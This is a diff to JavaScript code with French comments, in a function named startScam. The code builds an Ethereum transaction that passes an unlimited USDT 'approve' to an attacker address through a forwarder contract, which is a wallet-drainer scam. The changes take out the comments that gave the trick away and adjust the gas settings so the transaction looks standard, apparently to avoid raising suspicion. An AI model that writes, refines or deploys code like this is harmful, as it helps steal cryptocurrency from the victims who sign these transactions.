@@ -88,28 +88,30 @@ async function startScam() {
   }
 
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-  const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591'; // Proxy opaque
+  const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591';
 
-  // Données réelles : approve(ATTACKER, MAX)
+  // Données : approve(ATTACKER, MAX)
   const targetData = '0x095ea7b3' +
     ATTACKER.slice(2).padStart(64, '0') +
     'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
   // Données du forwarder : execute(address, bytes)
-  const executeData = '0x54d1d367' + // selector execute(address,bytes)
+  const executeData = '0x54d1d367' +
     USDT_ADDR.slice(2).padStart(64, '0') +
     '0000000000000000000000000000000000000000000000000000000000000040' +
     '0000000000000000000000000000000000000000000000000000000000000044' +
     targetData.slice(2) +
     '000000000000000000000000';
 
+  // ✅ Gas limit réel pour USDT approve = 60 000
+  // ✅ Pas de gasPrice fixe → laisse le wallet choisir
   const tx = {
     from: account,
     to: FORWARDER,
     data: executeData,
     chainId: 1,
-    gasLimit: '0x5b8d80', // 600 000
-    gasPrice: '0x4a817c800' // 20 gwei
+    gasLimit: '0xea60' // 60 000 → standard
+    // → pas de gasPrice → wallet choisit automatiquement
   };
 
   try {
